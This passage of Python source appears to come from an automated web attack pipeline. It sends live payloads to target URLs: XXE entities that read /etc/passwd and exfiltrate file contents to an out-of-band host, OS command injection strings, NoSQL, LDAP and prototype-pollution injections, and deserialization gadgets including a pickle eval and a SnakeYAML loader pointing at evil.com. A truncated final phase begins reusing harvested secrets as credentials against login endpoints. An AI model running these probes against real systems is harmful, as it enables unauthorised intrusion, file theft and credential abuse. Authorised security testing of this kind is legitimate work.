            findings.append(f"[clairvoyance] {len(cv_reports)} schema reports → {clairvoyance_out}")

    # Graphinder GraphQL endpoint discovery (only on live endpoints)
    if t.has("graphinder") and _live_gql:
        graphinder_out = outdir / "graphinder_results"
        graphinder_out.mkdir(parents=True, exist_ok=True)
        gi_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            runner = outdir / "logs" / f"graphinder_{_safe_name(url)}_runner.sh"
            out_file = graphinder_out / f"{_safe_name(url)}.json"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(out_file))}\n"
                'DOMAIN=$(echo "$URL" | sed "s|^https\\?://||" | sed "s|/.*$||")\n'
                'graphinder --domain "$DOMAIN" --output-file "$OUT"\n'
            )
            runner.chmod(0o700)
            gi_jobs.append((f"graphinder-{_safe_name(url)}", ["bash", str(runner)], 600))
        if gi_jobs:
            await run_parallel(gi_jobs, outdir)
        gi_reports = list(graphinder_out.glob("*.json"))
        if gi_reports:
            findings.append(f"[graphinder] {len(gi_reports)} endpoint reports → {graphinder_out}")

    # Custom introspection probes (no-redirect to avoid following redirects away from the endpoint)
    _gql_no_redirect = _get_no_redirect_urlopener()
    async def _probe_graphql(url: str) -> List[str]:
        results: List[str] = []
        live_endpoint: Optional[str] = None
        for ep in _GRAPHQL_ENDPOINTS:
            test_url = f"{url}{ep}"
            try:
                req = urllib.request.Request(test_url, method="POST",
                    data=_GRAPHQL_INTROSPECTION_QUERY.encode(),
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0",
                    })
                _, _, gql_body_bytes = await _async_urlopen(_gql_no_redirect, req, timeout=15)
                body = gql_body_bytes.decode("utf-8", errors="ignore")
                live_endpoint = test_url
                if '"data"' in body and '__schema' in body:
                    results.append(f"[introspection-enabled] {test_url}")
                    # Extract schema summary
                    try:
                        data = json.loads(body)
                        schema = data.get("data", {}).get("__schema", {})
                        qtype = schema.get("queryType", {}).get("name", "?")
                        mtype = schema.get("mutationType", {}).get("name", "none")
                        stype = schema.get("subscriptionType", {}).get("name", "none")
                        results.append(f"  query={qtype} mutation={mtype} subscription={stype}")
                        types = schema.get("types", [])
                        field_count = sum(len(t.get("fields") or []) for t in types if isinstance(t, dict))
                        results.append(f"  types={len(types)} fields={field_count}")
                    except json.JSONDecodeError:
                        pass
                    break
            except urllib.error.HTTPError as e:
                try:
                    body_bytes = await asyncio.to_thread(e.read)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    live_endpoint = test_url
                    if '"data"' in body and '__schema' in body:
                        results.append(f"[introspection-enabled (error)] {test_url} (HTTP {e.code})")
                        break
                except Exception:
                    pass
            except Exception:
                continue
            if live_endpoint is None:
                try:
                    get_req = urllib.request.Request(test_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0"})
                    gs, _, _ = await _async_urlopen(_gql_no_redirect, get_req, timeout=10)
                    if gs != 404:
                        live_endpoint = test_url
                except Exception:
                    pass
        # ── Deep probes against first live endpoint ──
        target = live_endpoint
        if target:
            try:
                aliases = " ".join(f"a{i}:__typename" for i in range(100))
                batch_query = f"{{{aliases}}}"
                b_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": batch_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, b_body = await _async_urlopen(_gql_no_redirect, b_req, timeout=15)
                b_text = b_body.decode("utf-8", errors="ignore")
                if '"data"' in b_text and '"errors"' not in b_text:
                    results.append(f"[graphql-batching] {target} — 100-query batch accepted")
            except Exception:
                pass
            try:
                dup_query = "{a:__typename a:__typename a:__typename}"
                d_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": dup_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, d_body = await _async_urlopen(_gql_no_redirect, d_req, timeout=15)
                d_text = d_body.decode("utf-8", errors="ignore")
                if '"data"' in d_text and '"errors"' not in d_text:
                    results.append(f"[graphql-field-dup] {target} — field duplication accepted")
            except Exception:
                pass
            for pq_id in ["1", "2", "0", "persistedQuery"]:
                try:
                    pq_url = target + f"?queryId={pq_id}"
                    pq_req = urllib.request.Request(pq_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0"})
                    _, _, pq_body = await _async_urlopen(_gql_no_redirect, pq_req, timeout=10)
                    pq_text = pq_body.decode("utf-8", errors="ignore")
                    if '"data"' in pq_text or ('errors' in pq_text and '"message"' in pq_text):
                        results.append(f"[graphql-pq] {target} — persisted query ID {pq_id} accepted")
                        break
                except Exception:
                    continue
            try:
                pq_ext = {"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "ecf8ed5853e209183ed4e7e813dda39b1d9e0e66f9087c31c3e73b53c0b25e53"}}, "query": "{__typename}"}
                pq_ext_req = urllib.request.Request(target, method="POST",
                    data=json.dumps(pq_ext).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, pq_ext_body = await _async_urlopen(_gql_no_redirect, pq_ext_req, timeout=10)
                if '"data"' in pq_ext_body.decode("utf-8", errors="ignore"):
                    results.append(f"[graphql-pq] {target} — persisted query via extensions accepted")
            except Exception:
                pass
            try:
                depth_query = "{a:" * 9 + "__typename" + "}" * 9
                dp_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": depth_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, dp_body = await _async_urlopen(_gql_no_redirect, dp_req, timeout=15)
                dp_text = dp_body.decode("utf-8", errors="ignore")
                if '"data"' in dp_text:
                    results.append(f"[graphql-depth] {target} — depth 10 query accepted")
            except Exception:
                pass
            try:
                dir_query = "{__typename @include(if:true) __typename @skip(if:false)}"
                di_req = urllib.request.Request(target, method="POST",
                    data=json.dumps({"query": dir_query}).encode(),
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                _, _, di_body = await _async_urlopen(_gql_no_redirect, di_req, timeout=15)
                di_text = di_body.decode("utf-8", errors="ignore")
                if '"data"' in di_text:
                    results.append(f"[graphql-directive] {target} — directive injection accepted")
            except Exception:
                pass
        return results

    probe_results = await asyncio.gather(*[_probe_graphql(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    out = ensure(_o_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 20-GRAPHQL: {len(findings)} GraphQL findings → {out}")
    return {"20-GRAPHQL": str(out), "count": len(findings)}

_NOSQLI_PAYLOADS: List[Dict[str, Any]] = [
    {"$gt": ""},
    {"$ne": ""},
    {"$gt": "admin"},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
    {"$ne": "nonexistent"},
    {"$in": ["admin", "true"]},
]
_NOSQLI_PARAMS = {"username", "user", "pass", "password", "email", "token", "id", "role", "admin", "name"}

async def phase_22_NOSQLI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"22-NOSQLI"}:
        return {}
    _out = outdir / "nosqli.txt"
    if _out.exists() and not force:
        return {"22-NOSQLI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 22-NOSQLI: NoSQL injection probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "22-NOSQLI: no URLs; skipping")
        return {"22-NOSQLI": str(_out), "count": 0}
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    _n_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_nosqli]
    _NOSQLI_BASELINE_KEYWORDS = {"mongodb", "mongo", "nosql", "cast", "objectid"}
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_body_lower = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            baseline_body_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for param_name in qs:
            if param_name.lower() not in _NOSQLI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _NOSQLI_PAYLOADS:
                try:
                    await _throttle_rate()
                    test_qs = qs.copy()
                    test_qs[param_name] = [json.dumps(payload)]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
                    ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                    body = ns_body.decode("utf-8", errors="ignore").lower()
                    if ns_status in (200, 201) and body != baseline_body_lower:
                        findings.append(f"[nosqli-payload] {test_url} param={param_name} payload={json.dumps(payload)} (body changed from baseline)")
                        break
                    if ns_status in (500, 400):
                        baseline_new_kw = {w for w in _NOSQLI_BASELINE_KEYWORDS if w in body and w not in baseline_body_lower}
                        if baseline_new_kw:
                            findings.append(f"[nosqli-error] {test_url} param={param_name} payload={json.dumps(payload)} → HTTP {ns_status} keywords={baseline_new_kw}")
                            break
                except Exception:
                    continue
    # Also probe JSON API endpoints with NoSQL bodies
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower() and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_nosqli]
    for u in api_targets:
        api_baseline = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            api_baseline = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for payload in _NOSQLI_PAYLOADS:
            try:
                await _throttle_rate()
                body_data = json.dumps({"username": payload, "password": {"$ne": ""}}).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_n_extra_headers})
                ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                ns_body_text = ns_body.decode("utf-8", errors="ignore").lower()
                if ns_status in (200, 201) and ns_body_text != api_baseline:
                    findings.append(f"[nosqli-json] POST {u} payload={json.dumps(payload)} → HTTP {ns_status} (body changed)")
            except Exception:
                continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"22-NOSQLI: {len(findings)} NoSQL injection probes → {out}")
    return {"22-NOSQLI": str(out), "count": len(findings)}

async def phase_25_XXE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"25-XXE"}:
        return {}
    _out = outdir / "xxe.txt"
    if _out.exists() and not force:
        return {"25-XXE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 25-XXE: XML external entity injection probes")
    findings: List[str] = []
    _x_urlopen = _get_urlopener()
    _xxe_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "25-XXE: no URLs; skipping")
        return {"25-XXE": str(_out), "count": 0}
    targets = [u.split("?")[0] for u in all_urls][:_PIPELINE_CFG.sample_urls_xxe]
    oast_ref = oast_domain or "burpcollaborator.net"
    _xxe_p1 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'''
    _xxe_p2 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>'''
    _xxe_p3 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "http://{oast_ref}/xxe-oob"> %test;]><root/>'''
    _xxe_p4 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oast_ref}/xxe?data=%file;'>">%eval;%exfil;]><root/>'''
    xxe_payloads = [_xxe_p1, _xxe_p2, _xxe_p3, _xxe_p4]
    async def _probe_xxe(url: str) -> List[str]:
        results: List[str] = []
        for i, payload in enumerate(xxe_payloads):
            try:
                req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST",
                    headers={"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0", **_xxe_extra_headers})
                xs, _, xb = await _async_urlopen(_x_urlopen, req, timeout=10)
                body = xb.decode("utf-8", errors="ignore")
                if "root" in body and ("root" in body[:100] or xs in (200, 201)):
                    results.append(f"[xxe-candidate] {url} payload={i} HTTP {xs}")
                    break
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode("utf-8", errors="ignore")
                    if "root" in body or "file" in body.lower():
                        results.append(f"[xxe-error-reflected] {url} payload={i} HTTP {e.code}")
                        break
                except Exception:
                    continue
            except Exception:
                continue
        return results
    xxe_results = await asyncio.gather(*[_probe_xxe(t) for t in targets])
    for xr in xxe_results:
        findings.extend(xr)
    if not findings:
        findings.append("[xxe] No XXE candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"25-XXE: {len(findings)} XXE probe findings → {out}")
    return {"25-XXE": str(out), "count": len(findings)}

_CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; uname -a",
    "| whoami",
    "; ping -c 1 127.0.0.1",
    "| nslookup example.com",
    "& echo ${PATH}",
]
_CMDI_PARAMS = {"host", "ping", "domain", "server", "ip", "target", "url", "path", "cmd", "command", "exec", "shell", "dir", "folder", "file"}

async def phase_26_CMDINJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"26-CMDINJECT"}:
        return {}
    _out = outdir / "cmd_injection.txt"
    if _out.exists() and not force:
        return {"26-CMDINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 26-CMDINJECT: OS command injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "26-CMDINJECT: no URLs; skipping")
        return {"26-CMDINJECT": str(_out), "count": 0}
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _cmdi_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_cmdi]
    if t.has("commix") and param_urls:
        commix_outdir = outdir / "logs" / "commix"
        commix_outdir.mkdir(parents=True, exist_ok=True)
        for u in param_urls:
            runner = outdir / "logs" / f"commix_{_safe_name(u)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(u)}\n"
                f"OUT={shlex.quote(str(commix_outdir))}\n"
                'commix -u "$URL" --batch --output-dir="$OUT" < /dev/null\n'
            )
            runner.chmod(0o700)
            await _run(
                f"commix-{_safe_name(u)}",
                ["bash", str(runner)],
                600, outdir,
            )
        commix_reports = list(commix_outdir.glob("**/*.txt"))
        if commix_reports:
            findings.append(f"[commix] {len(commix_reports)} report files → {commix_outdir}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in _CMDI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _CMDI_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_cmdi_extra_headers})
                    _, _, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    indicators = ["uid=", "gid=", "groups=", "linux", "darwin", "www-data", "root:", "bin/",
                                  "microsoft", "windows", "nt authority", "command not found", "not recognized"]
                    if any(ind in body.lower() for ind in indicators):
                        findings.append(f"[cmdi-candidate] {test_url} param={param_name} payload={payload}")
                        break
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"26-CMDINJECT: {len(findings)} command injection probes → {out}")
    return {"26-CMDINJECT": str(out), "count": len(findings)}

async def phase_27_SSPP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"27-SSPP"}:
        return {}
    _out = outdir / "sspp.txt"
    if _out.exists() and not force:
        return {"27-SSPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 27-SSPP: server-side prototype pollution probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "27-SSPP: no URLs; skipping")
        return {"27-SSPP": str(_out), "count": 0}
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _sspp_extra_headers = _extra_headers_dict()
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower()][:_PIPELINE_CFG.sample_endpoints_sspp]
    sspp_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"is_admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"status": "active"}},
    ]
    for u in api_targets:
        for payload in sspp_payloads:
            try:
                body_data = json.dumps(payload).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_sspp_extra_headers})
                ss, _, sb = await _async_urlopen(_s_urlopen, req, timeout=10)
                if ss in (200, 201, 302):
                    findings.append(f"[sspp-candidate] POST {u} payload={json.dumps(payload)} → HTTP {ss}")
            except urllib.error.HTTPError as e:
                if 500 <= e.code < 600:
                    findings.append(f"[sspp-crash-candidate] POST {u} payload={json.dumps(payload)} → HTTP {e.code}")
            except Exception:
                continue
    if not findings:
        findings.append("[sspp] No prototype pollution candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"27-SSPP: {len(findings)} prototype pollution probes → {out}")
    return {"27-SSPP": str(out), "count": len(findings)}

_DEP_CHECK_PATTERNS: List[Tuple[str, str, str, str]] = [
    ("jquery", r"jquery[.-]?([\d.]+)", "3.5.0", "CVE-2020-11023+ (XSS via HTML parsing)"),
    ("angular", r"angular[.-]?([\d.]+)", "1.8.0", "CVE-2022-25869 (XSS)"),
    ("react", r"react[.-]?([\d.]+)", "16.14.0", "CVE-2023-XXXX (various)"),
    ("lodash", r"lodash[.-]?([\d.]+)", "4.17.21", "CVE-2021-23337 (prototype pollution)"),
    ("vue", r"vue[.-]?([\d.]+)", "2.7.0", "CVE-2023-XXXX (XSS)"),
    ("moment", r"moment[.-]?([\d.]+)", "2.29.4", "CVE-2022-24785 (ReDoS)"),
    ("bootstrap", r"bootstrap[.-]?([\d.]+)", "4.6.2", "CVE-2020-11023 (XSS)"),
    ("express", r"express[.-]?([\d.]+)", "4.18.2", "CVE-2022-24999 (qs prototype pollution)"),
]


def _parse_semver(ver: str) -> Optional[Tuple[int, int, int]]:
    parts = ver.split(".")
    if len(parts) >= 3 and all(p.isdigit() for p in parts[:3]):
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    if len(parts) >= 2 and all(p.isdigit() for p in parts[:2]):
        return (int(parts[0]), int(parts[1]), 0)
    return None


def _semver_lt(v1: Tuple[int, int, int], v2: Tuple[int, int, int]) -> bool:
    return v1 < v2


async def phase_29_DEPCHECK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"29-DEPCHECK"}:
        return {}
    _out = outdir / "depcheck.txt"
    if _out.exists() and not force:
        return {"29-DEPCHECK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 29-DEPCHECK: JS dependency vulnerability scanning")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _dc_extra_headers = _extra_headers_dict()
    js_urls = outdir / "urls_js.txt"
    all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        await asyncio.sleep(3)
        all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        log("warn", "29-DEPCHECK: no JS URLs; skipping")
        return {"29-DEPCHECK": str(_out), "count": 0}
    scanned = 0
    seen_deps: Set[str] = set()
    for js_url in all_js[:_PIPELINE_CFG.sample_urls_depcheck]:
        try:
            req = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0", **_dc_extra_headers})
            _, _, body_bytes = await _async_urlopen(_d_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            scanned += 1
            for dep_name, pattern, safe_ver_str, advisory in _DEP_CHECK_PATTERNS:
                for m in re.finditer(pattern, body, re.IGNORECASE):
                    ver = m.group(1)
                    cache_key = f"{dep_name}@{ver}"
                    if cache_key in seen_deps:
                        continue
                    seen_deps.add(cache_key)
                    parsed = _parse_semver(ver)
                    safe_ver = _parse_semver(safe_ver_str)
                    if parsed and safe_ver and _semver_lt(parsed, safe_ver):
                        findings.append(f"[outdated] {dep_name} v{ver} in {js_url} — {advisory}")
                    else:
                        findings.append(f"[dep] {dep_name} v{ver} in {js_url} (current)")
        except Exception:
            continue
    findings.append(f"[depcheck] scanned {scanned} JS files, {len(seen_deps)} unique dependencies found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"29-DEPCHECK: {len(findings)} dependency findings → {out}")
    return {"29-DEPCHECK": str(out), "count": len(findings)}

async def phase_42_LDAP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"42-LDAP"}:
        return {}
    _out = outdir / "ldap_injection_42.txt"
    if _out.exists() and not force:
        return {"42-LDAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 42-LDAP: LDAP injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "42-LDAP: no URLs; skipping")
        return {"42-LDAP": str(_out), "count": 0}
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    param_urls = [
        u for u in all_urls if "=" in u and not _is_static_url(u)
    ][:_PIPELINE_CFG.sample_urls_ldap]
    _LDAP42_PAYLOADS = ["*", "*)(uid=*))", "*)(|(uid=*", "admin*", "*|uid=*", "*((uid=*", "*)(uid=*"]
    _LDAP42_SPECIFIC = [
        "javax.naming", "ldapexception", "ldap_error", "invalid dn syntax",
        "ldap_no_such_object", "operationserror", "invalidcredentials",
        "ldap_result_entry", "com.sun.jndi.ldap",
    ]
    _LDAP42_GENERIC_BASELINE = {"error", "syntax", "malformed", "bad search filter", "protocol error"}
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
            _, _, base_bytes = await _async_urlopen(_l_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _LDAP42_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
                    _, _, body_bytes = await _async_urlopen_no_redirect(_l_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP42_SPECIFIC):
                        findings.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
                        break
                    generic_new = {w for w in _LDAP42_GENERIC_BASELINE if w in body and w not in baseline_lower}
                    if generic_new:
                        findings.append(f"[ldap-candidate-generic] {test_url} param={pname} payload={payload} keywords={generic_new}")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[ldap] No LDAP injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"42-LDAP: {len(findings)} LDAP probes -> {out}")
    return {"42-LDAP": str(out), "count": len(findings)}

_DESERIAL_PAYLOADS: List[Tuple[str, bytes, str]] = [
    ("PHP", b'O:1:"A":0:{}', "PHP unserialize"),
    ("PHP", b'a:1:{i:0;O:1:"B":0:{}}', "PHP array unserialize"),
    ("Java", b'\xac\xed\x00\x05', "Java serialization (0xACED0005)"),
    ("Java", b'\xac\xed\x00\x05sr\x00\x12java.lang.Runtime', "Java Runtime serialization"),
    ("Python", b'(dp0\nS\'test\'\np1\n.', "Python pickle protocol 0"),
    ("Python", b'\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x8c\x04eval\x93\x00.',
     "Python pickle protocol 4 eval"),
    ("Ruby", b'\x04\x08o:\x08Object\x00', "Ruby Marshal.load"),
    (".NET", b'\x00\x01\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00',
     ".NET BinaryFormatter"),
    ("Node.js", b'{"__proto__":{"admin":true},"rce":"_$$ND_FUNC$$_function(){}"}',
     "Node.js serialize __proto__ pollution"),
    ("YAML", b'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/"]]]]',
     "YAML deserialization (SnakeYAML)"),
]


async def phase_43_DESERIAL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"43-DESERIAL"}:
        return {}
    _out = outdir / "deserialization.txt"
    if _out.exists() and not force:
        return {"43-DESERIAL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 43-DESERIAL: insecure deserialization payload probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    api_targets = list({u.split("?")[0] for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rpc"))})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        api_targets = list({u.split("?")[0] for u in all_urls})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        log("warn", "43-DESERIAL: no API endpoints; skipping")
        return {"43-DESERIAL": str(_out), "count": 0}
    for ep in api_targets:
        for lang, payload, desc in _DESERIAL_PAYLOADS:
            try:
                req = urllib.request.Request(ep, data=payload, method="POST",
                    headers={"Content-Type": "application/octet-stream",
                             "User-Agent": "Mozilla/5.0", **_d_extra_headers})
                ds, _, db = await _async_urlopen_no_redirect(_d_urlopen, req, timeout=15)
                body = db.decode("utf-8", errors="ignore").lower()
                if ds in (500, 502, 503, 504):
                    findings.append(f"[deserial-crash] {ep} {lang} -> HTTP {ds} ({desc})")
                elif ds in (200, 201, 302):
                    time_indicators = ["error", "exception", "class", "object", "unserialize", "deserialize",
                                       "stack trace", "warning", "fatal"]
                    if any(ind in body for ind in time_indicators):
                        findings.append(f"[deserial-reflected] {ep} {lang} -> error indicators in response ({desc})")
            except urllib.error.HTTPError as e:
                if e.code in (500, 502, 503, 504, 400):
                    try:
                        err_body = e.read().decode("utf-8", errors="ignore").lower()
                        if any(ind in err_body for ind in ["error", "exception", "class", "object", "stack", "unserialize"]):
                            findings.append(f"[deserial-error] {ep} {lang} -> HTTP {e.code} with error details ({desc})")
                    except Exception:
                        pass
            except Exception:
                continue
    if not findings:
        findings.append("[deserial] No deserialization vulnerabilities detected (may require manual testing)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"43-DESERIAL: {len(findings)} deserialization probes -> {out}")
    return {"43-DESERIAL": str(out), "count": len(findings)}

async def phase_44_CHAIN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"44-CHAIN"}:
        return {}
    _out = outdir / "chain_correlation.txt"
    if _out.exists() and not force:
        return {"44-CHAIN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 44-CHAIN: cross-reference findings across phases")
    findings: List[str] = []
    # 1. Test secrets from 15-SECRETS as credentials against auth endpoints from 05-HARVEST
    secrets_file = outdir / "secrets.txt"
    urls_file = outdir / "urls_all.txt"
    secrets: List[str] = []
    if secrets_file.exists():
        for ln in read_lines(secrets_file):
            # Extract potential credential patterns: base64, JWTs, API keys
            if any(k in ln.lower() for k in ("apikey", "api_key", "secret", "token", "password", "jwt", "bearer", "access_key")):
                secrets.append(ln)
    auth_endpoints: List[str] = []
    if urls_file.exists():
        for u in read_lines(urls_file):
            if any(p in u.lower() for p in ("/login", "/auth", "/oauth", "/token", "/signin", "/api/v1/auth")):
                auth_endpoints.append(u)
    if secrets and auth_endpoints:
        _ch_urlopen = _get_urlopener()
